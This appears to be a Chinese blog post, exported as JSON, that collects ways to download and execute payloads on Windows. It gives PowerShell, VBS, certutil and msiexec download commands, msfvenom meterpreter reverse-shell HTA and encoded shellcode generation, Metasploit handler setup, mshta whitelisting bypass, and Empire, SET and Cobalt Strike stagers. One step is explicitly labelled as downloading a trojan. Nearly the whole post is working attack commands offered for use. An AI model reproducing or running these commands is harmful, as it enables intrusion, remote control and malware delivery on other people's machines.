{"title":"Windows下载payload执行命令的一些方式","slug":"2019-04-30-Windows下载payload的一些方式","date":"2019-10-19T09:56:50.000Z","updated":"2019-10-23T13:22:59.288Z","comments":true,"excerpt":"","content":"<h5 id=\"PowerShell下载\"><a href=\"#PowerShell下载\" class=\"headerlink\" title=\"PowerShell下载\"></a>PowerShell下载</h5><pre><code>powershell &quot;$c=new-Object \\&quot;System.Net.WebClient\\&quot;;$c.DownloadFile(\\&quot;http://123.207.xx.xx:81/static/lcx.exe\\&quot;,\\&quot;C:/Users/Administrator/Desktop/lcx.exe\\&quot;);&quot;;(下载路径必须是完整的绝对路径)\n</code></pre><h5 id=\"VBS下载\"><a href=\"#VBS下载\" class=\"headerlink\" title=\"VBS下载\"></a>VBS下载</h5><pre><code>echo iLocal = LCase(WScript.Arguments(1)) &gt; 1.vbs\necho iRemote = LCase(WScript.Arguments(0)) &gt;&gt; 1.vbs\necho Set xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; 1.vbs\necho xPost.Open &quot;GET&quot;,iRemote,0 &gt;&gt; 1.vbs\necho xPost.Send() &gt;&gt; 1.vbs\necho Set sGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt; 1.vbs\necho sGet.Mode = 3 &gt;&gt; 1.vbs\necho sGet.Type = 1 &gt;&gt; 1.vbs\necho sGet.Open() &gt;&gt; 1.vbs\necho sGet.Write(xPost.responseBody) &gt;&gt; 1.vbs\necho sGet.SaveToFile iLocal,2 &gt;&gt; 1.vbs\n</code></pre><p>执行命令下载木马：</p>\n<pre><code>cscript http://xx.xxx.xx.xx/1.exe 1.exe\n</code></pre><h5 id=\"certutil-exe下载\"><a href=\"#certutil-exe下载\" class=\"headerlink\" title=\"certutil.exe下载\"></a>certutil.exe下载</h5><pre><code>certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt\n</code></pre><h5 id=\"Msiexec下载\"><a href=\"#Msiexec下载\" class=\"headerlink\" title=\"Msiexec下载\"></a>Msiexec下载</h5><pre><code>msiexec /q /i http://192.168.1.115/robots.txt\n</code></pre><h5 id=\"mshta-白名单绕过\"><a href=\"#mshta-白名单绕过\" class=\"headerlink\" title=\"mshta(白名单绕过)\"></a>mshta(白名单绕过)</h5><h6 id=\"msfvenom生成hta\"><a href=\"#msfvenom生成hta\" class=\"headerlink\" title=\"msfvenom生成hta\"></a>msfvenom生成hta</h6><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=6666 -f hta-psh &gt; shell.hta\n</code></pre><p>metasploit监听：</p>\n<pre><code>use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost xx.xx.xx.xx\nset lport 6666\n</code></pre><p>执行hta文件：</p>\n<pre><code>mshta.exe http://xx.xx.xx.xx/shell.hta\n</code></pre><p><img src=\"https://raw.githubusercontent.com/fanxinglove/fanxinglove.github.io/master/img/4.30/2.png\" alt></p>\n<h6 id=\"mestasploit生成hta下载路径\"><a href=\"#mestasploit生成hta下载路径\" class=\"headerlink\" title=\"mestasploit生成hta下载路径\"></a>mestasploit生成hta下载路径</h6><p>msf生成代码：</p>\n<pre><code>use exploit/windows/misc/hta_server\nset payload windows/meterpreter/reverse_tcp\nset lhost xx.xx.xx.xx\nset lport 6666\n</code></pre><p>mshta.exe执行hta</p>\n<pre><code>mshta.exe http://xx.xx.xx.xx/pKz4Kk059Nq9.hta\n</code></pre><p><img src=\"https://raw.githubusercontent.com/fanxinglove/fanxinglove.github.io/master/img/4.30/1.png\" alt></p>\n<h6 id=\"Empire生成hta\"><a href=\"#Empire生成hta\" class=\"headerlink\" title=\"Empire生成hta\"></a>Empire生成hta</h6><pre><code>listeners\nuselistener http\nset Host http://xx.xx.xx.xx:6666\nset Port 6666\nexecute\n</code></pre><p><img src=\"https://raw.githubusercontent.com/fanxinglove/fanxinglove.github.io/master/img/4.30/4.png\" alt></p>\n<pre><code>back\nusestager windows/hta\nset Listener 名字\nset OuFile 保存路径\nexecute\n</code></pre><p><img src=\"https://raw.githubusercontent.com/fanxinglove/fanxinglove.github.io/master/img/4.30/3.png\" alt></p>\n<h6 id=\"Setoolkit生成hta\"><a href=\"#Setoolkit生成hta\" class=\"headerlink\" title=\"Setoolkit生成hta\"></a>Setoolkit生成hta</h6><p>kali打开setoolkit，选择</p>\n<pre><code>1.Social-Engineering Attacks\n2.Website Attack Vectors\n3.HTA Attack Method\n4.Site Cloner\n</code></pre><p>设置克隆的网站，反弹shell的ip和端口，选择3，Meterpreter Reverse TCP</p>\n<p><img src=\"C:\\Users\\fanxing\\fanxinglove.github.io\\public\\img\\4.30\\5.png\" alt></p>\n<p>mshta执行hta</p>\n<pre><code>mshta http://xx.xx.xx.xx/Launcher.hta\n</code></pre><h6 id=\"CobaltStrike生成hta\"><a href=\"#CobaltStrike生成hta\" class=\"headerlink\" title=\"CobaltStrike生成hta\"></a>CobaltStrike生成hta</h6><p>选择攻击-&gt;生成后门-&gt;HTML Application</p>\n<p><img src=\"C:\\Users\\fanxing\\fanxinglove.github.io\\public\\img\\4.30\\6.png\" alt></p>\n<h5 id=\"白加黑名单加载payload\"><a href=\"#白加黑名单加载payload\" class=\"headerlink\" title=\"白加黑名单加载payload\"></a>白加黑名单加载payload</h5><h6 id=\"MSBuild\"><a href=\"#MSBuild\" class=\"headerlink\" title=\"MSBuild\"></a>MSBuild</h6><p>msfvenom生成shellcode：</p>\n<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=xx.xx.xx.xx lport=6666 -f csharp\n</code></pre><h5 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h5><p><a href=\"https://www.cnblogs.com/backlion/p/10491616.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/backlion/p/10491616.html</a></p>\n","categories":[],"tags":[]}